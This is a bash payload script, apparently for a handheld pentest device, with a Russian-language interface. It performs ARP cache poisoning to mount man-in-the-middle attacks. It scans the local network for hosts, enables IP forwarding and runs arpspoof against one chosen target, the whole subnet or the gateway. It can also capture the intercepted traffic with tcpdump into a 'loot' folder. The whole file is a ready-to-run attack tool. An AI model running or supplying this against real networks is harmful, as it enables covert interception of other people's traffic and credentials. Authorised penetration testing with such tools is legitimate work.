#!/bin/bash
# Title: ARP Spoof
# Author: NullSec
# Description: Отравление ARP для MITM-атак с выбором цели
# Category: nullsec/interception

# FIX: UI PATH and fallbacks
export PATH=/usr/sbin:/sbin:/bin:/mmc/usr/sbin:/mmc/usr/bin:$PATH
command -v PROMPT >/dev/null 2>&1 || PROMPT() { echo "$1"; read -p "Press Enter: "; }
command -v ERROR_DIALOG >/dev/null 2>&1 || ERROR_DIALOG() { echo "ERROR: $1" >&2; exit 1; }
command -v LOG >/dev/null 2>&1 || LOG() { echo "[LOG] $1"; }
command -v SPINNER_START >/dev/null 2>&1 || SPINNER_START() { echo "[*] $1"; }
command -v SPINNER_STOP >/dev/null 2>&1 || SPINNER_STOP() { echo "[✓] Done"; }
command -v NUMBER_PICKER >/dev/null 2>&1 || NUMBER_PICKER() { echo "$1"; read -p "Choice: " choice; echo "${choice:-$2}"; }
command -v TEXT_PICKER >/dev/null 2>&1 || TEXT_PICKER() { echo "$1"; read -p "Value: " val; echo "$val"; }
command -v CONFIRMATION_DIALOG >/dev/null 2>&1 || CONFIRMATION_DIALOG() { echo "$1"; read -p "Confirm (y/n): " confirm; [ "$confirm" = "y" ] && echo "0" || echo "1"; }

# FIX: Dummy duckyscript constants
DUCKYSCRIPT_CANCELLED=1
DUCKYSCRIPT_REJECTED=2
DUCKYSCRIPT_USER_CONFIRMED=0

# Автоматически находит правильный сетевой интерфейс (экспортирует $IFACE).
# В случае неудачи показывает сообщение об ошибке на пейджере.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/arpspoof"
mkdir -p "$LOOT_DIR"

PROMPT "ARP SPOOF

Отравление ARP-кэша для
атак \"человек посередине\".

Перенаправляет трафик
цели через это устройство
для перехвата.

ВНИМАНИЕ: активная атака.
Будет заметна в сети.

Нажмите ОК для настройки."

# Find interface
IFACE=""
for i in br-lan eth0 wlan1 $IFACE; do
    [ -d "/sys/class/net/$i" ] && IFACE=$i && break
done
[ -z "$IFACE" ] && { ERROR_DIALOG "Интерфейс не найден!"; exit 1; }

LOCAL_IP=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
SUBNET=$(ip addr show "$IFACE" | grep "inet " | awk '{print $2}')

[ -z "$GATEWAY" ] && { ERROR_DIALOG "Шлюз не обнаружен!"; exit 1; }

PROMPT "ИНФО О СЕТИ:

Интерфейс: $IFACE
Локальный IP: $LOCAL_IP
Шлюз: $GATEWAY
Подсеть: $SUBNET

Нажмите ОК для поиска
целей в сети."

SPINNER_START "Scanning for targets..."

SCAN_FILE="/tmp/arp_scan_$$.txt"
# ARP scan the local subnet
if command -v arp-scan >/dev/null 2>&1; then
    arp-scan --interface="$IFACE" --localnet 2>/dev/null | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}" > "$SCAN_FILE"
else
    # Fallback: ping sweep + arp table
    СЕТЬ=$(echo "$SUBNET" | cut -d'/' -f1 | sed 's/\.[0-9]*$/./')
    for i in $(seq 1 254); do
        ping -c 1 -W 1 "${СЕТЬ}${i}" >/dev/null 2>&1 &
    done
    wait
    arp -an | grep -v incomplete | grep "$IFACE" > "$SCAN_FILE"
fi

SPINNER_STOP

TARGET_COUNT=$(wc -l < "$SCAN_FILE" | tr -d ' ')
TARGET_LIST=$(head -10 "$SCAN_FILE" | awk '{print NR". "$1}')

PROMPT "НАЙДЕНО ЦЕЛЕЙ: $TARGET_COUNT

$TARGET_LIST

Нажмите ОК для выбора
режима цели."

PROMPT "РЕЖИМ ЦЕЛИ:

1. Одна цель
2. Вся подсеть
3. Только шлюз

Выберите режим."

TARGET_MODE=$(NUMBER_PICKER "Режим (1-3):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TARGET_MODE=1 ;; esac

TARGET_IP="$GATEWAY"
case $TARGET_MODE in
    1)
        TARGET_IP=$(TEXT_PICKER "Target IP:" "$(head -1 "$SCAN_FILE" | awk '{print $1}')")
        ;;
    2)
        TARGET_IP=""  # All hosts
        ;;
    3)
        TARGET_IP="$GATEWAY"
        ;;
esac

CAPTURE=$(CONFIRMATION_DIALOG "Перехват трафика?

Запустить tcpdump для
сохранения перехваченных
пакетов?")

DURATION=$(NUMBER_PICKER "Длительность (минут):" 10)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=10 ;; esac

resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ ARP SPOOF?

Цель: ${TARGET_IP:-ALL HOSTS}
Шлюз: $GATEWAY
Длительность: ${DURATION}m
Перехват: $([ \"$CAPTURE\" = \"$DUCKYSCRIPT_USER_CONFIRMED\" ] && echo ДА || echo НЕТ)

Подтвердить?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

TIMESTAMP=$(date +%Y%m%d_%H%M)
LOG "Запускаю ARP spoof..."
SPINNER_START "Poisoning ARP cache..."

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# FIX: Check if arpspoof is установлен
if ! command -v arpspoof >/dev/null 2>&1; then
    ERROR_DIALOG "arpspoof не установлен!
Установите: opkg install dsniff"
    exit 1
fi

# Start traffic capture if requested
if [ "$CAPTURE" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    PCAP="$LOOT_DIR/arpspoof_$TIMESTAMP.pcap"
    timeout $((DURATION * 60)) tcpdump -i "$IFACE" -w "$PCAP" -s 0 not arp 2>/dev/null &
    CAP_PID=$!
fi

# ARP spoofing
if [ -n "$TARGET_IP" ]; then
    # Spoof target <-> gateway
    timeout $((DURATION * 60)) arpspoof -i "$IFACE" -t "$TARGET_IP" "$GATEWAY" 2>/dev/null &
    SPOOF_PID1=$!
    timeout $((DURATION * 60)) arpspoof -i "$IFACE" -t "$GATEWAY" "$TARGET_IP" 2>/dev/null &
    SPOOF_PID2=$!
else
    # Spoof entire subnet
    timeout $((DURATION * 60)) arpspoof -i "$IFACE" "$GATEWAY" 2>/dev/null &
    SPOOF_PID1=$!
    SPOOF_PID2=""
fi

SPINNER_STOP

PROMPT "ARP SPOOF АКТИВЕН!

Цель: ${TARGET_IP:-ALL}
Шлюз: $GATEWAY

Трафик перенаправляется
через это устройство.

Нажмите ОК по завершении
или дождитесь ${DURATION}m."

wait $SPOOF_PID1 2>/dev/null
[ -n "$SPOOF_PID2" ] && wait $SPOOF_PID2 2>/dev/null
[ -n "$CAP_PID" ] && { kill $CAP_PID 2>/dev/null; wait $CAP_PID 2>/dev/null; }

# Disable forwarding
echo 0 > /proc/sys/net/ipv4/ip_forward

PCAP_SIZE=""
[ -f "$PCAP" ] && PCAP_SIZE=$(du -h "$PCAP" | awk '{print $1}')

rm -f "$SCAN_FILE"

PROMPT "ARP SPOOF ОСТАНОВЛЕН

Длительность: ${DURATION}m
Цель: ${TARGET_IP:-ALL}
$([ -n "$PCAP_SIZE" ] && echo "Перехват: $PCAP_SIZE" || echo "Перехват отсутствует")

Перенаправление выключено.
ARP таблицы восстановятся.

Нажмите ОК для выхода."

exit 0
